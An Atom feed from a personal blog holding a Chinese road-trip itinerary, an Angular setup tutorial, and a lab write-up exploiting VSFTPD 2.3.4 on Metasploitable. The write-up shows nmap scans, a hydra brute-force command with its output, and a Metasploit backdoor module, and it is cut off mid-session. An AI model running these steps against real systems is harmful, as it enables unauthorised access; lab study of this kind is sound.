<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>congdong007</title>
  
  <subtitle>Penetration Test、Software Developer</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-05-03T03:28:21.283Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Dong Cong</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>trips</title>
    <link href="http://example.com/2024/05/01/trips/"/>
    <id>http://example.com/2024/05/01/trips/</id>
    <published>2024-05-01T17:28:07.000Z</published>
    <updated>2024-05-03T03:28:21.283Z</updated>
    
    <content type="html"><![CDATA[<p><font color=blue size=5>1.总路线图</font></p><p> <img src="/images/1.png">  </p><p> 合计里程数:<font color=red  size=5>5100km</font></p><p><font color=blue size=5>2.费用汇总</font></p><p><font color=blue size=5>3.出发前的准备</font><br>网上预定：旅馆、汽车轮渡、出海观鲸船</p><p>地图：有些地段手机无信号，提前下载offline map.</p><p>重要物品：证件、信用卡、银行卡、少许现金、口罩、疫苗证明（没用上）</p><p>衣物：内衣、短袖、短裤、长袖、长裤、薄外套、厚外套、旅游鞋。</p><p>（今年天热，我几乎全程短袖T恤和七分裤，带多了长裤和长袖外套，几乎都没用上）</p><p>（但一件薄长袖或薄运动外套还是必要的，早晚海边防海风，开车或坐副驾驶位置时防晒。）</p><p>海滩衣物： 游泳衣、拖鞋、凉鞋、沙滩大浴巾、泳镜、沙滩鞋，孩子最好有游泳上衣（在海滩上大部分时间是玩水，不是游泳，上衣可防晒伤）</p><p>防晒物：帽子、墨镜、防晒霜（防水的），芦荟面膜或芦荟胶。</p><p>常用药： 创可贴、消炎膏、感冒药、喉糖、小棉鉴，口罩，防蚊喷雾、after bite, 湿纸巾、消毒纸巾.</p><p>食物：瓶装水、几袋方便面、饼干、零食、苹果 (走trail时，吃个苹果又挡饥又解渴）（食品不用多，以备不时之需）</p><p>挖贝壳和海鲜工具：小桶、铲子、长柄铁锹</p><p>其它：沙滩椅、便携式小气炉、小锅（煮挖到的贝壳海鲜）、一次性碗筷。伞（本是想沙滩遮阳，后用来挡雨了）、一次性薄雨衣（轻便易携带）、洗漱用品、化妆品。</p><p>气垫床、睡袋（看网上的攻略带了，但我们没有露营，带上是以备海边排屋别墅里床不够。实际上有沙发床和薄毯、床单，很干净。所以全程没有用上。）</p><p>自驾车的另一优点：只要车子装得下，东西可以尽量多带。</p><p><font color=blue size=5>4.具体行程</font></p><p><font color=green size=5>Day 1.</font> <font color=blue size=5>Quebec City</font><br> 步行游览了古镇小店街区Quartier Petit Champlain，很有特色。<br> <img src="/images/qc_city_1.jpg"><br> 魁北克，很美的城市，感觉很悠闲,很惬意。<br> <img src="/images/qc_city_2.jpg"><br>本段里程数:<font color=red  size=5>290km</font><br><font color=green size=5>Day 2.</font> <font color=blue size=5>Rimouski (Quebec) </font><br> 可参观退役的潜艇<br> <img src="/images/MD_SHMPAP-009.jpg"><br> 有一个类似的历史博物馆(Site historique maritime de la Pointe-au-Père)<br>  <img src="/images/DSC_7696.JPG"> </p><p>  建议沿着132号公路行进<br>  Rimouski, Quebec  -&gt; Matane  Quebec (100km) -&gt; Sainte-Anne-des-Monts (90km) -&gt; Saint-Maxime-du-Mont-Louis(60km) -&gt; L’Anse-Pleureuse(7km) -&gt; Manche-d’Épée (16km)  -&gt; Cap de la Madeleine Lighthouse (32km) -&gt;  Gaspé (135km)  </p><p>  Matane  Quebec :<br> <img src="/images/Matane1.jpg"><br> <img src="/images/Matane2.jpg"><br>  Sainte-Anne-des-Monts :<br><img src="/images/Sainte-Anne-des-Monts1.jpg"><br><img src="/images/Sainte-Anne-des-Monts2.jpg"><br><img src="/images/Sainte-Anne-des-Monts3.jpg"> </p><p>本段里程数:<font color=red  size=5>380km</font><br><font color=green size=5>Day 3.</font> <font color=blue size=5>Gaspé (Quebec)</font><br>  Gaspé Quebec :<br>  <img src="/images/gaspe1.jpg"><br>  Gaspé museum:(市区)<br>  <img src="/images/gaspe2.jpg"><br>  <img src="/images/gaspe3.jpg"><br>  Phare de Cap Gaspé(国家公园,Parc national Forillon)<br>  <img src="/images/gaspe4.jpg"><br>  <img src="/images/gaspe5.jpg"><br>  <img src="/images/gaspe6.jpg"><br>  Haldimand Beach:(国家公园,Parc national Forillon)<br>  <img src="/images/gaspe7.jpg"><br>  <img src="/images/gaspe8.jpg"><br>  <img src="/images/gaspe9.jpg"><br>本段里程数:<font color=red  size=5>400km</font><br><font color=green size=5>Day 4.</font> <font color=blue size=5>Campbellton (New Brunswick)</font><br>  建议沿着132号公路行进<br>  Gaspesie Museum - &gt; Belvédère baie de Gaspé (22.5km) - &gt; Rocher Tête D’Indien(17.2km) -&gt; Plage de Bridgeville (18km)[有一个非常好的海滩,可以多玩一会] -&gt; Sandy beach of Coin du Banc(4km) -&gt; Cap Mont Joli(10km)[著名的风景] -&gt; Magasin Général Historique Authentique 1928(10km) -&gt; Phare Cap-d’Espoir(7km) -&gt; Plage de l’Anse à la Chaloupe (28km)[有个漂亮的海滩] -&gt;  Base Plein Air de Bellefeuille(13.2km)[有个漂亮的海滩] -&gt; L’Anse aux Îlots Beach(10km)<br>  -&gt; Parc Colborne(7.8km)[海边野公园] -&gt; Quai de Saint-Godefroi(36km)[有个漂亮的海滩] - &gt; Plage de Hope(6.7km)[有个漂亮的海滩] -&gt; Site historique national de Paspébiac(7.6km)[临时关闭] -&gt; Plage McGraw(10.6km)[有个海滩,稍微有点脏]<br>  -&gt; Phare de la pointe Bonaventure(12km)[宿营休闲海滩,不太干净,可以钓鱼,捉海鲜]</p><p>本段里程数:<font color=red  size=5>310km</font><br><font color=green size=5>Day 5.</font> <font color=blue size=5>Miramichi (New Brunswick)</font><br>本段里程数:<font color=red  size=5>180km</font><br><font color=green size=5>Day 6.</font> <font color=blue size=5>Amherst (Nova Scotia)</font><br>本段里程数:<font color=red  size=5>190km</font><br><font color=green size=5>Day 7.</font> <font color=blue size=5>Charlotte town (Prince Edward Island)</font><br>本段里程数:<font color=red  size=5>120km</font><br><font color=green size=5>Day 8.</font> <font color=blue size=5>Charlotte town (Prince Edward Island)</font><br>本段里程数:<font color=red  size=5>200km</font><br><font color=green size=5>Day 9.</font> <font color=blue size=5>Amherst (Nova Scotia)</font><br>本段里程数:<font color=red  size=5>120km</font><br><font color=green size=5>Day 10.</font> <font color=blue size=5>Halifax (Nova Scotia)</font><br>本段里程数:<font color=red  size=5>260km</font><br><font color=green size=5>Day 11.</font> <font color=blue size=5>Halifax (Nova Scotia)</font><br>本段里程数:<font color=red  size=5>100-200km</font><br><font color=green size=5>Day 12.</font> <font color=blue size=5>Moncton (New Brunswick)</font><br>本段里程数:<font color=red  size=5>260km</font><br><font color=green size=5>Day 13.</font> <font color=blue size=5>Edmundston (New Brunswick)</font><br>本段里程数:<font color=red  size=5>450km</font><br><font color=green size=5>Day 14.</font> <font color=blue size=5>home</font><br>本段里程数:<font color=red  size=5>550km</font></p><p><font color=blue size=5>5.小结</font></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;font color=blue size=5&gt;1.总路线图&lt;/font&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;/images/1.png&quot;&gt;  &lt;/p&gt;
&lt;p&gt; 合计里程数:&lt;font color=red  size=5&gt;5100km&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;fon</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Angular from Beginner to Hero (1) -- Setting up the Local Environment and Workspace</title>
    <link href="http://example.com/2022/06/18/angular-start/"/>
    <id>http://example.com/2022/06/18/angular-start/</id>
    <published>2022-06-19T01:07:20.000Z</published>
    <updated>2023-10-19T20:31:51.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h1><p>  To use the Angular framework, you should be familiar with the following:<br>   – JavaScript<br>   – HTML<br>   – CSS<br>  Knowledge of TypeScript is helpful, but not required.</p><p>  To install Angular on your local system, you need the following:</p><ol><li>Node.js:<br>Angular requires an active LTS or maintenance LTS version of Node.js.<br>Here’s the newest version in nodejs.org&#x2F;en:<br><img src="/images/nodejs.jpg"><br>If you are unsure what version of Node.js runs on your system, run node -v in a terminal window.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">v16.17.1</span><br></pre></td></tr></table></figure></li><li>npm Package Manager:<br>Angular, the Angular CLI, and Angular applications depend on npm packages for many features and functions. To download and install npm packages, you need an npm package manager. This guide uses the npm client command line interface, which is installed with Node.js by default. To check that you have the npm client installed, run npm -v in a terminal window.</li></ol><h1 id="Install-the-Angular-CLI"><a href="#Install-the-Angular-CLI" class="headerlink" title="Install the Angular CLI"></a>Install the Angular CLI</h1><p>  To install the Angular CLI, open a terminal window and run the following command:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @angular/cli</span><br></pre></td></tr></table></figure></p><h1 id="Create-a-workspace-and-initial-application"><a href="#Create-a-workspace-and-initial-application" class="headerlink" title="Create a workspace and initial application"></a>Create a workspace and initial application</h1><p>  You develop apps in the context of an Angular workspace.</p><p>  To create a new workspace and initial starter app:<br>    1. Run the CLI command ng new and provide the name my-app, as shown here:<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng new my-app</span><br></pre></td></tr></table></figure><br>    2. The ng new command prompts you for information about features to include in the initial app. Accept the defaults by pressing the Enter or Return key.</p><p>  The Angular CLI installs the necessary Angular npm packages and other dependencies. This can take a few minutes.</p><p>  The CLI creates a new workspace and a simple Welcome app, ready to run.</p><h1 id="Run-the-application"><a href="#Run-the-application" class="headerlink" title="Run the application"></a>Run the application</h1><p>  The Angular CLI includes a server, for you to build and serve your app locally.</p><ol><li>Navigate to the workspace folder, such as my-app.</li><li>Run the following command:  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> my-app</span><br><span class="line">ng serve --open</span><br></pre></td></tr></table></figure>  The ng serve command launches the server, watches your files, and rebuilds the app as you make changes to those files.<br>  The –open (or just -o) option automatically opens your browser to <a href="http://localhost:4200/">http://localhost:4200/</a>.</li></ol><p>  If your installation and setup was successful, you should see a page similar to the following.</p><p>  <img src="/images/app-works.png"> </p><h1 id="Compile-and-Package"><a href="#Compile-and-Package" class="headerlink" title="Compile and Package"></a>Compile and Package</h1><p>  Angular CLI also provides commands:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng build --prod</span><br></pre></td></tr></table></figure><br>  Among them, the parameter –prod tells the compilation environment to compile for the production environment package.</p><p>  Similarly, in the ‘angular.json’ file, default compilation parameters are defined, and if necessary, they can be modified. The main configuration parameters are as follows.<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;configurations&quot;</span>: &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="string">&quot;budgets&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;initial&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumWarning&quot;</span>: <span class="string">&quot;5mb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumError&quot;</span>: <span class="string">&quot;10mb&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;anyComponentStyle&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumWarning&quot;</span>: <span class="string">&quot;1mb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumError&quot;</span>: <span class="string">&quot;4mb&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">       ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  Angular, by default, compiles to the ‘dist’ directory under the root directory, generating pure static files (html, css, js), as well as image files.</p><h1 id="Deploy-to-a-Server"><a href="#Deploy-to-a-Server" class="headerlink" title="Deploy to a Server"></a>Deploy to a Server</h1><ol><li><p>Using the “phpStudy” tool, go into its root directory, which is usually something like “C:\phpStudy\PHPTutorial\WWW.”</p></li><li><p>Copy all the files from the ‘dist’ directory to the root directory “C:\phpStudy\PHPTutorial\WWW.”</p></li><li><p>Restart phpStudy’s services to make sure the changes take effect.</p></li><li><p>Open your Chrome browser, and you should be able to access the website by entering the following URL in the address bar: <a href="http://localhost/index.html">http://localhost/index.html</a></p></li></ol><p>  Make sure you have the correct directory paths, and that the files from the ‘dist’ directory are copied over to the correct location in the root directory. Additionally, ensure that the web server and PHP services in phpStudy are correctly configured and running.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Prerequisites&quot;&gt;&lt;a href=&quot;#Prerequisites&quot; class=&quot;headerlink&quot; title=&quot;Prerequisites&quot;&gt;&lt;/a&gt;Prerequisites&lt;/h1&gt;&lt;p&gt;  To use the Angular frame</summary>
      
    
    
    
    <category term="Angular from Beginner to Hero" scheme="http://example.com/categories/Angular-from-Beginner-to-Hero/"/>
    
    <category term="(1) Setting up the Local Environment and Workspace" scheme="http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"/>
    
    
  </entry>
  
  <entry>
    <title>VSFTPD 2.3.4 exploit</title>
    <link href="http://example.com/2021/03/05/VSFTPD2-3-4pentest/"/>
    <id>http://example.com/2021/03/05/VSFTPD2-3-4pentest/</id>
    <published>2021-03-06T02:42:06.000Z</published>
    <updated>2024-01-05T22:20:45.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC"><a href="#metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC" class="headerlink" title="[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC"></a>[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC</h1><ol><li>Network Scan</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# nmap -A -sV 192.168.244.136</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 15:58 EST</span><br><span class="line">Nmap scan report for 192.168.244.136 (192.168.244.136)</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 977 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.244.140</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>VSFTPD 2.3.4 exploit with hydra</li></ol><p>First , we need construct dictionaries about username and password<br>here’s the dictionaries which usernames named usernames.txt and passwords named passwords.txt</p><p>then , we use the tools hydra with the follow command line:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /home/kali/Desktop/cd/mywordlists/usernames.txt -P /home/kali/Desktop/cd/mywordlists/passwords.txt 192.168.244.136 ftp -V</span><br></pre></td></tr></table></figure><p>here’s the command line ouput looks like:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-26 16:20:39</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.244.136:21/</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;admin&quot; - 1 of 25 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;msfadmin&quot; - 2 of 25 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;root&quot; - 3 of 25 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;user&quot; - 4 of 25 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;&quot; - 5 of 25 [child 4] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;admin&quot; - 6 of 25 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;msfadmin&quot; - 7 of 25 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;root&quot; - 8 of 25 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;user&quot; - 9 of 25 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;&quot; - 10 of 25 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;admin&quot; - 11 of 25 [child 10] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;msfadmin&quot; - 12 of 25 [child 11] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;root&quot; - 13 of 25 [child 12] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;user&quot; - 14 of 25 [child 13] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;&quot; - 15 of 25 [child 14] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;admin&quot; - 16 of 25 [child 15] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.244.136   login: msfadmin   password: msfadmin</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;msfadmin&quot; - 17 of 25 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;root&quot; - 18 of 25 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;user&quot; - 19 of 25 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;&quot; - 20 of 25 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;admin&quot; - 21 of 25 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;msfadmin&quot; - 22 of 25 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;root&quot; - 23 of 25 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;user&quot; - 24 of 25 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;&quot; - 25 of 25 [child 4] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.244.136   login: user   password: user</span><br><span class="line"></span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-05 21:20:47</span><br></pre></td></tr></table></figure><p>here, we found two users we could use to login the ftp server:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.244.136</span><br><span class="line">Connected to 192.168.244.136.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (192.168.244.136:kali): msfadmin</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||54670|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000            0 Oct 21 21:49 gordon.txt</span><br><span class="line">-rw-r--r--    1 1000     1000           29 Oct 30 23:31 myfile.log</span><br><span class="line">-rw-r--r--    1 1000     1000          914 Oct 21 14:59 nmap-list.txt</span><br><span class="line">drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd /</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; pwd</span><br><span class="line">Remote directory: /</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||54956|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 14  2012 bin</span><br><span class="line">drwxr-xr-x    4 0        0            1024 May 14  2012 boot</span><br><span class="line">lrwxrwxrwx    1 0        0              11 Apr 28  2010 cdrom -&gt; media/cdrom</span><br><span class="line">drwxr-xr-x   13 0        0           13860 Jan 05 20:57 dev</span><br><span class="line">drwxr-xr-x   94 0        0            4096 Jan 05 21:21 etc</span><br><span class="line">drwxr-xr-x    6 0        0            4096 Apr 16  2010 home</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 initrd</span><br><span class="line">lrwxrwxrwx    1 0        0              32 Apr 28  2010 initrd.img -&gt; boot/initrd.img-2.6.24-16-server</span><br><span class="line">drwxr-xr-x   13 0        0            4096 May 14  2012 lib</span><br><span class="line">drwx------    2 0        0           16384 Mar 16  2010 lost+found</span><br><span class="line">drwxr-xr-x    4 0        0            4096 Mar 16  2010 media</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Apr 28  2010 mnt</span><br><span class="line">-rw-------    1 0        0           57012 Jan 05 20:54 nohup.out</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 opt</span><br><span class="line">dr-xr-xr-x  118 0        0               0 Jan 05 20:54 proc</span><br><span class="line">drwxr-xr-x   13 0        0            4096 Jan 05 20:54 root</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 14  2012 sbin</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 srv</span><br><span class="line">drwxr-xr-x   12 0        0               0 Jan 05 20:54 sys</span><br><span class="line">drwxrwxrwt    5 0        0            4096 Jan 05 20:59 tmp</span><br><span class="line">drwxr-xr-x   12 0        0            4096 Apr 28  2010 usr</span><br><span class="line">drwxr-xr-x   14 0        0            4096 Mar 17  2010 var</span><br><span class="line">lrwxrwxrwx    1 0        0              29 Apr 28  2010 vmlinuz -&gt; boot/vmlinuz-2.6.24-16-server</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure><ol start="3"><li>VSFTPD 2.3.4 exploit with metasploit:</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service</span><br><span class="line">   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 1</span><br><span class="line">[*] No payload configured, defaulting to cmd/unix/interact</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show info</span><br><span class="line"></span><br><span 